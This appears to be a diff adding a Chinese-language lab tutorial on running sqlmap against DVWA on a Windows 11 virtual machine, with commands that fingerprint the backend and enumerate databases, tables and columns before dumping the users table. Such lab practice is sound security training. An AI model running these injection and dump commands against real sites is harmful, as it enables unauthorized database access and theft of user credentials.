@@ -1,0 +1,27 @@
+**Step 1：SQLMap 信息获取**
+──────────────────────────────────────────────────────────────────────────────
+
+  # 使用 --cookie 参数保持登录状态
+  sqlmap -u "http://Windows11虚拟机/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+    --cookie="security=low; PHPSESSID=ID" --batch
+
+  # --batch = 自动选择默认选项
+  # 后端环境识别（关键资产信息）
+  web服务器系统：Windows
+  中间件：Apache 版本 + PHP 版本
+  数据库：MySQL >=5.1
+  扫描日志保存路径：/home/demon/.local/share/sqlmap/output/
+
+**Step 2：SQLMap 常用操作**
+──────────────────────────────────────────────────────────────────────────────
+  ① 列出所有数据库：
+  sqlmap -u "目标URL" --cookie="xxx" --dbs --batch
+
+  ② 列出指定数据库的表：
+  sqlmap -u "目标URL" --cookie="xxx" -D dvwa --tables --batch
+
+  ③ 列出指定表的字段：
+  sqlmap -u "目标URL" --cookie="xxx" -D dvwa -T users --columns --batch
+
+  ④ 导出指定表的数据：
+  sqlmap -u "目标URL" --cookie="xxx" -D dvwa -T users --dump --batch
